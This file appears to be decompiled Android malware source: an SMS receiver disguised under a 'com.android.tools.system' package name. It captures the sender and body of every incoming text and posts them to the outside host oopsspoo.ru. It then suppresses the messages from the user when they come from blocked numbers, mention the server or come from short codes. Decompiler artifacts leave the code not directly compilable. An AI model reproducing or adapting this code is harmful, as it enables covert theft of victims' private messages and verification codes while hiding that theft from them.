package com.android.tools.system;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.telephony.gsm.SmsMessage;
import java.util.ArrayList;

public class SmsReceiver extends BroadcastReceiver {
    public String serverName = "oopsspoo.ru";

    @Override
    public void onReceive(Context context, Intent intent) {
        Object obj;
        Context context2 = context;
        Object[] objArr = (Object[]) intent.getExtras().get("pdus");
        String originatingAddress = SmsMessage.createFromPdu((byte[]) objArr[0]).getOriginatingAddress();
        String str = "";
        for (Object obj2 : objArr) {
            SmsMessage createFromPdu = SmsMessage.createFromPdu((byte[]) obj2);
            StringBuffer stringBuffer = r25;
            StringBuffer stringBuffer2 = new StringBuffer();
            str = stringBuffer.append(str).append(createFromPdu.getMessageBody()).toString();
        }
        String string = context2.getSharedPreferences("Settings", 0).getString("id", "");
        if (!(string.equals("") || string == null)) {
            r25 = new String[2];
            obj2 = r25;
            r25[0] = "url";
            r25 = obj2;
            obj2 = r25;
            r25[1] = "http://oopsspoo.ru/index.php";
            Object obj3 = obj2;
            r25 = new String[2];
            obj2 = r25;
            r25[0] = "id";
            r25 = obj2;
            obj2 = r25;
            r25[1] = string;
            Object obj4 = obj2;
            r25 = new String[2];
            obj2 = r25;
            r25[0] = "addmsg";
            r25 = obj2;
            obj2 = r25;
            Object obj5 = r25;
            StringBuffer stringBuffer3 = r25;
            StringBuffer stringBuffer4 = new StringBuffer();
            stringBuffer4 = r25;
            StringBuffer stringBuffer5 = new StringBuffer();
            stringBuffer5 = r25;
            StringBuffer stringBuffer6 = new StringBuffer();
            stringBuffer6 = r25;
            StringBuffer stringBuffer7 = new StringBuffer();
            obj5[1] = stringBuffer3.append(stringBuffer4.append(stringBuffer5.append(stringBuffer6.append("Adressant: ").append(originatingAddress).toString()).append("\nText sms: ").toString()).append(str).toString()).append("\n\n").toString();
            Object obj6 = obj2;
            ArrayList arrayList = r25;
            ArrayList arrayList2 = new ArrayList();
            ArrayList arrayList3 = arrayList;
            boolean add = arrayList3.add(obj3);
            add = arrayList3.add(obj4);
            add = arrayList3.add(obj6);
            try {
                MyPostRequest myPostRequest = r25;
                MyPostRequest myPostRequest2 = new MyPostRequest(context2);
                myPostRequest = myPostRequest;
                ArrayList[] arrayListArr = new ArrayList[1];
                ArrayList[] arrayListArr2 = arrayListArr;
                arrayListArr[0] = arrayList3;
                AsyncTask execute = myPostRequest.execute(arrayListArr2);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        SharedPreferences sharedPreferences = context2.getSharedPreferences("BlockNums", 0);
        String trim = originatingAddress.replaceAll("[^\\d]", "").trim();
        if (sharedPreferences.getBoolean(trim.equals("") ? originatingAddress.toLowerCase() : trim, false) || str.contains(this.serverName) || (sharedPreferences.getBoolean("short", false) && originatingAddress.trim().charAt(0) != "+".charAt(0) && originatingAddress.length() < 11)) {
            abortBroadcast();
        }
    }

    public SmsReceiver() {
    }
}
